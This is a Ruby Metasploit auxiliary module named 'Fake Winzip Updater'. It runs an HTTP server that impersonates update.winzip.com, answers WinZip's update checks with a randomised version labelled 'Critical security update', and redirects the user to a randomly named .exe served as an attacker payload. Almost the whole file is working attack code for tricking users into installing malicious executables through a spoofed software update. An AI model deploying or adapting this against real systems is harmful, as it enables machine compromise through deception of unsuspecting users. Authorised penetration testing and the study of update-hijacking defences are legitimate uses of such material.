require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake Winzip Updater',
			'Version'     => '1.0',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake Winzip updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
			], self.class)

		@base = {
			'vh' => ['update.winzip.com'],
			'request' => [{
				'req' => '(/updates/wnzpes.txt|/cgi\-bin/updateinfo.cgi)', 
				'type' => 'string', 
				'method' => '', 
				'bin'    => 0,
				'string' => "<%VERSION%>\n\\n\\n<%DESCRIPTION%>",
				'parse' => 1,
				'file' => '',
			},
			{
				'req' => '/dnldwz.cgi', 
				'type' => 'string', 
				'method' => '', 
				'bin'    => 0,
				'string' => '<html><script>window.location="http://update.winzip.com/winzipupdate<%RND1%>.exe"</script></html>',
				'parse' => 1,
				'file' => '',
			},
			{
				'req' => '.exe', 
				'type' => 'agent', 
				'method' => '', 
				'bin'    => 1,		    
				'string' => '',
				'parse' => 0,
				'file' => ''
			}
			],
			'options' => {  
				'description'  => { 
					'val' => 'Critical security update',
					'desc' => 'Description display in the update'
				},
				'version'  => { 
					'val' => '"30#{RndNum(1)}.#{RndNum(4)}.#{RndNum(1)}"',
					'hidden' => 1,
					'dynamic' =>1
				},
				'rnd1'  => { 
					'val' => 'RndNum(5)',
					'hidden' => 1,
					'dynamic' =>1
				}			    	  
			}
		}
	end
end
